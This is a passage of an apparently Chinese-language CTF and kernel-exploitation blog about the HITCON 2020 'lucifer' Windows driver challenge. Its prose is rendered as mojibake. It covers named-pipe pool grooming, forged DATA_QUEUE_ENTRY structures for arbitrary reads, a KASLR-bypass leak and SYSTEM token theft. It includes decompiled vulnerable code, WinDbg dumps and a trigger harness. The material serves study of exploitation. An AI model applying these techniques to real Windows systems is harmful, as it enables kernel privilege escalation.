OutputBufferLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//create the pipe/file in FILE_FLAG_OVERLAPPED mode (blocking mode)</span></span><br><span class="line"><span class="built_in">NtFsControlFile</span>(pipe_handle, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;isb, <span class="number">0x119FF8</span>, buf, sz, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h4 id="æº¢å‡ºæ•°æ®è¶³å¤Ÿå¤š"><a href="#æº¢å‡ºæ•°æ®è¶³å¤Ÿå¤š" class="headerlink" title="æº¢å‡ºæ•°æ®è¶³å¤Ÿå¤š"></a>æº¢å‡ºæ•°æ®è¶³å¤Ÿå¤š</h4><p>å¯ä»¥æ§åˆ¶æ•´ä¸ª DATA_QUEUE_ENTRY</p>
<p>IRPä»»æ„è¯»</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DATA_QUEUE_ENTRY:</span><br><span class="line"> NextEntry=whatever;</span><br><span class="line"> Irp=Forged IRP Address;</span><br><span class="line"> SecurityContext=ideally <span class="number">0</span>;</span><br><span class="line"> EntryType=<span class="number">1</span>;  <span class="comment">// unbuffered</span></span><br><span class="line"> QuotaInEntry=ideally <span class="number">0</span>;</span><br><span class="line"> DataSize=arbitrary read size;</span><br><span class="line"> x=whatever;</span><br><span class="line"> </span><br><span class="line">IRP-&gt;SystemBuffer = arbitrary read address</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹DataSizeè¶Šç•Œè¯»</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DATA_QUEUE_ENTRY:</span><br><span class="line"> NextEntry=whatever;</span><br><span class="line"> Irp=ideally <span class="number">0</span>;</span><br><span class="line"> SecurityContext=ideally <span class="number">0</span>;</span><br><span class="line"> EntryType=<span class="number">0</span>;</span><br><span class="line"> QuotaInEntry=ideally <span class="number">0</span>; <span class="comment">//mostly irrelevent in case we use the peek operation</span></span><br><span class="line"> DataSize=something bigger than the original size;</span><br><span class="line"> x=whatever;</span><br></pre></td></tr></table></figure>

<p>ç›¸å…³åˆ©ç”¨ï¼š<a href="https://github.com/scwuaptx/CTF/tree/master/2020-writeup/hitcon/lucifer">HITCON 2020 lucifer</a></p>
<h4 id="æº¢å‡ºé•¿åº¦æ¯”è¾ƒå°"><a href="#æº¢å‡ºé•¿åº¦æ¯”è¾ƒå°" class="headerlink" title="æº¢å‡ºé•¿åº¦æ¯”è¾ƒå°"></a>æº¢å‡ºé•¿åº¦æ¯”è¾ƒå°</h4><p>ç»“æ„ä½“ç¬¬ä¸€ä¸ªå…ƒç´ Queueï¼Œæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æ˜¯å¯ä»¥ä¿®æ”¹é“¾è¡¨çš„æŒ‡å‘ï¼ŒæŒ‡å‘å…¶ä½™çš„DATA_QUEUE_ENTRYï¼Œä½†æ˜¯windowså­˜åœ¨å®‰å…¨æœºåˆ¶ï¼Œæ£€æŸ¥<code>entry-&gt;Flink-&gt;Blink!=entry</code></p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>PeekNamedPipe</code> è¯»å–è€Œä¸é‡Šæ”¾</p>
<h4 id="overflow-ä»»æ„åœ°å€å†™"><a href="#overflow-ä»»æ„åœ°å€å†™" class="headerlink" title="overflow-&gt;ä»»æ„åœ°å€å†™"></a>overflow-&gt;ä»»æ„åœ°å€å†™</h4><p>1å­—èŠ‚æº¢å‡º</p>
<h3 id="HITCON-2020-lucifer"><a href="#HITCON-2020-lucifer" class="headerlink" title="HITCON 2020 lucifer"></a>HITCON 2020 lucifer</h3><p><a href="https://github.com/scwuaptx/CTF/tree/master/2020-writeup/hitcon/lucifer">lucifer</a>ï¼šWindows 10 Pro 20H2ï¼Œä¸€ä¸ªéå¸¸ä½çš„æƒé™è¿è¡Œ <code>cmd.exe</code></p>
<p>OOB writeï¼Œangleboyè¿˜å¸¦æœ‰ç›¸å…³PPTï¼Œçœ‹PPT</p>
<p>å››ä¸ªåŠŸèƒ½ï¼Œç»å…¸èœå•å †</p>
<p>é¦–å…ˆæ˜¯Createï¼šåœ¨NonPagedPoolNxåˆ›å»º0x400å¤§å°çš„chunk</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222000</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create\n&quot;</span>);</span><br><span class="line">  v8 = <span class="built_in">sub_1400051DC</span>();</span><br><span class="line">  <span class="keyword">goto</span> LABEL_16;</span><br><span class="line"><span class="function">__int64 <span class="title">sub_1400051DC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  PVOID PoolWithTag; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  PoolWithTag = Destination;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination )</span><br><span class="line">  &#123;</span><br><span class="line">    PoolWithTag = <span class="built_in">ExAllocatePoolWithTag</span>((POOL_TYPE)<span class="number">512</span>, <span class="number">0x400</span>ui64, <span class="number">0x6963754C</span>u); </span><br><span class="line">    Destination = PoolWithTag;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !PoolWithTag )</span><br><span class="line">    v0 = <span class="number">0xC0000017</span>;</span><br><span class="line">  <span class="built_in">RtlZeroMemory</span>(PoolWithTag, <span class="number">0</span>i64, <span class="number">1024</span>i64);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ADD: system buffer æ˜¯æˆ‘ä»¬ä¼ é€’çš„å‚æ•°ï¼Œå¯ä»¥çœ‹å‡ºæ¥æ˜¯ä¸ªèµ‹å€¼</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222004</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;ADD\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SystemBuffer &amp;&amp; InputBufferLength &gt;= <span class="number">0x18</span> )</span><br><span class="line">  &#123;</span><br><span class="line">	v11 = SystemBuffer[<span class="number">2</span>];</span><br><span class="line">	v13 = *(_OWORD *)SystemBuffer;          <span class="comment">// SystemBuffer</span></span><br><span class="line">	v14 = v11;</span><br><span class="line">	v8 = <span class="built_in">sub_140001028</span>(&amp;v13);</span><br><span class="line">	<span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001028</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination || a1[<span class="number">1</span>] != <span class="number">0xDADADDAA</span>i64 )</span><br><span class="line">    result = <span class="number">0xC0000022</span>i64;</span><br><span class="line">  *((_QWORD *)Destination + *a1) = a1[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GETï¼šè¯»å–å†…å®¹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222008</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;GET\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SystemBuffer &amp;&amp; OutputBufferLength &gt;= <span class="number">0x18</span> &amp;&amp; InputBufferLength &gt;= <span class="number">0x18</span> )</span><br><span class="line">  &#123;</span><br><span class="line">	v9 = SystemBuffer[<span class="number">2</span>];</span><br><span class="line">	v13 = *(_OWORD *)SystemBuffer;</span><br><span class="line">	v14 = v9;</span><br><span class="line">	v8 = <span class="built_in">sub_14000107C</span>(&amp;v13);</span><br><span class="line">	v10 = v14;</span><br><span class="line">	*(_OWORD *)SystemBuffer = v13;</span><br><span class="line">	SystemBuffer[<span class="number">2</span>] = v10;</span><br><span class="line">	a2-&gt;IoStatus.Information = <span class="number">24</span>i64;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_14000107C</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination || a1[<span class="number">1</span>] != <span class="number">3671776682</span>i64 )</span><br><span class="line">    v1 = <span class="number">-1073741790</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &lt; <span class="number">0x80</span>ui64 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[<span class="number">2</span>] = *((_QWORD *)Destination + *a1);</span><br><span class="line">    a1[<span class="number">1</span>] = <span class="number">3735928559</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Releaseï¼Œfreeæ‰chunk</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22200C</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;Release\n&quot;</span>);</span><br><span class="line">  v8 = <span class="built_in">sub_1400010E0</span>();</span><br><span class="line"><span class="function">__int64 <span class="title">sub_1400010E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( Destination )</span><br><span class="line">    <span class="built_in">ExFreePoolWithTag</span>(Destination, <span class="number">0x6963754C</span>u);</span><br><span class="line">  Destination = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¼æ´ç‚¹ï¼šADDï¼Œæœ‰ä¸€ä¸ªè¶Šç•Œå†™ã€‚</p>
<p>WritePipeåœ¨å†…æ ¸æ€è°ƒç”¨äº†</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ExAllocatePoolWithTag</span>(NonpagedPoolNx, <span class="built_in">sizeof</span>(payload)+<span class="number">0x30</span>, tag)</span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡å†™pipeï¼Œå†…æ ¸æ€ä¼šæ·»åŠ ä¸€ä¸ª<code>DATA_QUEUE_ENTRY</code>ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DATA_QUEUE_ENTRY</span>&#123;</span><br><span class="line">    LIST_ENTRY Queue;        <span class="comment">// åŒå‘é“¾è¡¨</span></span><br><span class="line">    _IRP* Irp;</span><br><span class="line">    __int64 SecurityContext;</span><br><span class="line">    <span class="type">int</span> EntryType;</span><br><span class="line">    <span class="type">int</span> QuotaInEntry;</span><br><span class="line">    <span class="type">int</span> DataSize;           <span class="comment">// ä¸åŒ…å«å…ƒæ•°æ®</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">&#125; DATA_QUEUE_ENTRY,*PDATA_QUEUE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨ä¸€ç‚¹Debugä¿¡æ¯ï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹è·å¾—å¯¹è±¡çš„å¤§å°ï¼š0x440, åŒæ—¶ <code>!pool</code>å‘½ä»¤æ˜¾ç¤º pool headeråœ°å€</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; lm m Luc*</span><br><span class="line">Browse full module list</span><br><span class="line"><span class="built_in">start</span>             end                 module name</span><br><span class="line">fffff800`<span class="number">40</span>b70000 fffff800`<span class="number">40</span>b78000   Lucifer    (deferred)             </span><br><span class="line"><span class="number">0</span>: kd&gt; ba e1 fffff800`<span class="number">40</span>b70000+<span class="number">0</span>x5200</span><br><span class="line"><span class="number">0</span>: kd&gt; g</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; p</span><br><span class="line">Lucifer+<span class="number">0</span>x5206:</span><br><span class="line">fffff800`<span class="number">40</span>b75206 <span class="number">48890513</span>deffff  mov     qword ptr [Lucifer+<span class="number">0</span>x3020 (fffff800`<span class="number">40</span>b73020)],rax</span><br><span class="line"><span class="number">1</span>: kd&gt; r rax</span><br><span class="line">rax=ffff9a882f51c460</span><br><span class="line"><span class="number">1</span>: kd&gt; !pool ffff9a882f51c460</span><br><span class="line">Pool page ffff9a882f51c460 region is Nonpaged pool</span><br><span class="line"> ffff9a882f51c000 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  RLin</span><br><span class="line">*ffff9a882f51c450 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> ffff9a882f51c8b0 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  Viaa</span><br><span class="line"> ffff9a882f51cd10 size:  <span class="number">220</span> previous size:    <span class="number">0</span>  (Allocated)  AleP</span><br><span class="line"> ffff9a882f51cf30 size:   b0 previous size:    <span class="number">0</span>  (Free)       Y..=</span><br></pre></td></tr></table></figure>

<p>å¾€é‡Œé¢å†™0x400ä¸ªå†…å®¹ï¼Œ0x440 &#x3D; 0x10 pool header + 0x400 chunk + 0x30 padding</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !pool FFFFA489243E4A20</span><br><span class="line">unable to get nt!PspSessionIdBitmap</span><br><span class="line">Pool page ffffa489243e4a20 region is Nonpaged pool</span><br><span class="line"> ffffa489243e4000 size:  a00 previous size:    <span class="number">0</span>  (Allocated)  Thre</span><br><span class="line">*ffffa489243e4a10 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">		Owning component : <span class="built_in">Unknown</span> (update pooltag.txt)</span><br><span class="line"> ffffa489243e4e50 size:  <span class="number">190</span> previous size:    <span class="number">0</span>  (Free)       .l.:</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dq FFFFA489243E4A20 L88</span><br><span class="line">ffffa489`<span class="number">243e4</span>a20  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`deadbeef</span><br><span class="line"># ...</span><br><span class="line">ffffa489`<span class="number">243e4</span>e10  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`deadbeef</span><br><span class="line">ffffa489`<span class="number">243e4</span>e20  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e30  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e40  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e50  ba816c05`<span class="number">08f</span>395a9 <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>ç”¨äºè°ƒè¯•</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice;</span><br><span class="line">	DWORD dwRet;</span><br><span class="line">	BOOL stat;</span><br><span class="line">	hDevice = <span class="built_in">CreateFileW</span>(</span><br><span class="line">		DEVICE_NAME,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Error CreateFileW&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		hDevice,</span><br><span class="line">		<span class="number">0x222000</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;dwRet,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span> (!stat)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Error DeviceIoControl&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ADD</span></span><br><span class="line">	UINT64 data[<span class="number">3</span>];</span><br><span class="line">	data[<span class="number">1</span>] = <span class="number">0xDADADDAA</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; i++) &#123;</span><br><span class="line">		data[<span class="number">0</span>] = i;</span><br><span class="line">		data[<span class="number">2</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">		stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">			hDevice,</span><br><span class="line">			<span class="number">0x222004</span>,</span><br><span class="line">			&amp;data, <span class="built_in">sizeof</span>(data),</span><br><span class="line">			<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">			&amp;dwRet,</span><br><span class="line">			<span class="literal">NULL</span></span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;[+] ADD Done&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="comment">// release</span></span><br><span class="line">	stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		hDevice,</span><br><span class="line">		<span class="number">0x22200</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;dwRet,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>å¸ƒå±€å †é£æ°´</p>
<p>ä¸€ç§å †å–·æ–¹å¼ï¼šåˆ‡å‰²</p>
<ul>
<li>ä¸¤ä¸ªchunk: 0x800 + 0x7c0</li>
<li>0x800 åˆ‡å‰²æˆä¸€ä¸ªæ¼æ´å¯¹è±¡ï¼Œå¦ä¸€ä¸ªæ˜¯pipe</li>
<li>æ¦‚ç‡å‡ºç°æƒ³è¦çš„é£æ°´</li>
</ul>
<p>è¿˜å¯ä»¥ä½¿ç”¨è®ºæ–‡ä¸­çš„æ–¹å¼</p>
<ul>
<li>é¦–å…ˆ,åˆ†é…ä¸Šåƒä¸ªé€‰ä¸­å¤§å°çš„å—,ä»¥ç¡®ä¿é¦–å…ˆæ¸…ç©ºFreeChunkTreeä¸­æ‰€æœ‰å¤§äºæ‰€é€‰å¤§å°çš„å—.</li>
<li>ç„¶å,åˆ†é…å™¨å°†åˆ†é…0x10000å­—èŠ‚çš„æ–°VSå­—æ®µ,å¹¶å°†å…¶æ”¾å…¥FreeChunkTree.</li>
<li>ç„¶åå†åˆ†é…å‡ åƒä¸ªåˆ†å—,è¿™äº›åˆ†å—æœ€ç»ˆä¼šè¿›å…¥æ–°çš„å¤§ç©ºé—²åˆ†å—,å› æ­¤æ˜¯è¿ç»­çš„,ç„¶åé‡Šæ”¾æœ€ååˆ†é…çš„å—çš„3åˆ†ä¹‹1,ç”¨äºå¡«å……FreeChunkTree,åªæ˜¯æ”¾3åˆ†ä¹‹1å°†ç¡®ä¿ä¸ä¼šæœ‰æ•°æ®å—åˆå¹¶,æœ€åé‡æ–°åˆ†é…å·²é‡Šæ”¾çš„æ•°æ®å—,ä»¥æœ€å¤§é™åº¦å¢åŠ å–·å°„æœºä¼š.</li>
</ul>
<p>ç†æƒ³æ˜¯å¾—åˆ°è¿™æ ·çš„å †å¸ƒå±€</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span>: kd&gt; !pool FFFF8981621A6010</span><br><span class="line">unable to get nt!PspSessionIdBitmap</span><br><span class="line">Pool page ffff8981621a6010 region is Nonpaged pool</span><br><span class="line">*ffff8981621a6000 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> ffff8981621a6450 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  NpFr Process: ffff898162043080</span><br><span class="line"> ffff8981621a68a0 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  NpFr Process: ffff898162043080</span><br></pre></td></tr></table></figure>


<p>æŸ¥çœ‹pipeï¼Œheader</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span>: kd&gt; dq ffff8981621a6450</span><br><span class="line">ffff8981`<span class="number">621</span>a6450  <span class="number">7246704</span>e`<span class="number">0</span>a446f00 f7ca3fb8`<span class="number">9f</span>7f4811</span><br><span class="line">ffff8981`<span class="number">621</span>a6460  ffffcc05`<span class="number">0f</span>d259b8 ffffcc05`<span class="number">0f</span>d259b8</span><br><span class="line">ffff8981`<span class="number">621</span>a6470  <span class="number">00000000</span>`<span class="number">00000000</span> ffffcc05`<span class="number">10</span>a100f0</span><br><span class="line">ffff8981`<span class="number">621</span>a6480  <span class="number">000003</span>d0`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">000003</span>d0</span><br><span class="line">ffff8981`<span class="number">621</span>a6490  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64a0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64b0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64c0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br></pre></td></tr></table></figure>

<p>è¶Šç•Œå†™å…¥</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dq ffff8387c055d450</span><br><span class="line">ffff8387`c055d450  <span class="number">7246704</span>e`<span class="number">0</span>a440000 <span class="number">330b</span>b4ed`<span class="number">16b</span>fc9f1</span><br><span class="line">ffff8387`c055d460  ffffc288`<span class="number">07372b</span>d8 ffffc288`<span class="number">07372b</span>d8</span><br><span class="line">ffff8387`c055d470  <span class="number">00000000</span>`<span class="number">00000000</span> ffffc288`<span class="number">05794910</span></span><br><span class="line">ffff8387`c055d480  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`<span class="number">000003</span>d0</span><br><span class="line">ffff8387`c055d490  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4a0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4b0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4c0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br></pre></td></tr></table></figure>

<p>è¯»å–pipeè€Œä¸”ä¸freeæ‰chunkï¼Œå¯ä»¥ä½¿ç”¨</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PeekNamedPipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE  hNamedPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPVOID  lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            DWORD   nBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpBytesRead,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpTotalBytesAvail,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpBytesLeftThisMessage</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹DataSizeè¶Šç•Œè¯»å–ï¼Œæ³„éœ²ntçš„åŸºå€ï¼Œä»è€Œå¯ä»¥bypass kaslr</p>
<ul>
<li>Page segment &#x3D; PipeQueueEntry &amp; 0xfffffffffff00000 (Segment mask) </li>
<li>Signature of Page segment &#x3D; readmem(Page segment + 0x10) </li>
<li>Segcontext &#x3D; (Page segment) ^ (Signature of Page segment) ^ RtlpHpHeapGlobals.HeapKey ^ 0xA2E64EADA2E64EAD </li>
<li>Segment heap &#x3D; Segcontext - 0x100</li>
<li>callback function: Segment heap-&gt;VsContextï¼ŒRtlpHpHeapGlobals.HeapKey ^ encode data ^ VsContext address</li>
</ul>
<p>ä»»æ„åœ°å€è¯»å–ï¼šEntryType ä¸ºunbufferæ—¶å¯ä»¥è¯»å–Irpï¼Œè€Œè¿™ä¸ªIrpå¯ä»¥ä¼ªé€ </p>
<p>ææƒï¼šæˆ‘ä»¬å¯ä»¥è¯»å–systemçš„tokenå€¼ï¼Œç„¶åæ ¹æ®é©±åŠ¨çš„ä»»æ„å†™å†™å…¥å½“å‰è¿›ç¨‹</p>
<h3 id="API-å‰ç¼€"><a href="#API-å‰ç¼€" class="headerlink" title="API å‰ç¼€"></a>API å‰ç¼€</h3><p>ä»£è¡¨ç€Windows nativeï¼ˆåŸç”Ÿï¼‰ç³»ç»ŸæœåŠ¡ï¼ˆsystem servicesï¼‰ä¾‹ç¨‹ï¼ˆroutinesï¼‰ã€‚  </p>
<p>Ke ï¼ kernelçš„ç¼©å†™ï¼Œä»£è¡¨çš„æ˜¯å†…æ ¸æ¨¡å¼çš„APIæ¥å£ã€‚  </p>
<p>Nt ï¼ Windows New Technologyçš„ç¼©å†™ï¼Œä»£è¡¨çš„æ˜¯ Windows ç³»ç»ŸæœåŠ¡åŠŸèƒ½APIæ¥å£ã€‚ å¤§éƒ¨åˆ†ä»¥Ntå¼€å¤´çš„å‡½æ•°ï¼Œéƒ½æ˜ å°„åˆ°äº†ç”¨æˆ·æ€ï¼ˆUser Modeï¼‰APIæ¥å£ã€‚æ¯”å¦‚ä½ ç¼–å†™çš„ç”¨æˆ·æ¨¡å¼ç¨‹åºï¼Œç”¨åˆ°äº†CreateFileè¿™ä¸ªå‡½æ•°ï¼Œç”±äºå®ƒéœ€è¦è®¿é—®ç³»ç»Ÿå†…éƒ¨çš„æ•°æ®ç»“æ„ï¼Œå¿…é¡»è¦è¿›å…¥å†…æ ¸æ¨¡å¼ï¼Œè¿™æ—¶çš„ç¨‹åºå°±è¦è½¬å…¥å†…æ ¸æ¨¡å¼ï¼Œç›¸å¯¹åº”çš„å†…æ ¸æ¨¡å¼åŠŸèƒ½æœåŠ¡æ¥å£ï¼Œæ­£æ˜¯ntdll.dllä¸­çš„NtCreateFileï¼Œå®ƒæœ€ç»ˆå®Œæˆæ¥è‡ªç”¨æˆ·æ€ç¨‹åºçš„å‡½æ•°åŠŸèƒ½è¯·æ±‚ã€‚  </p>
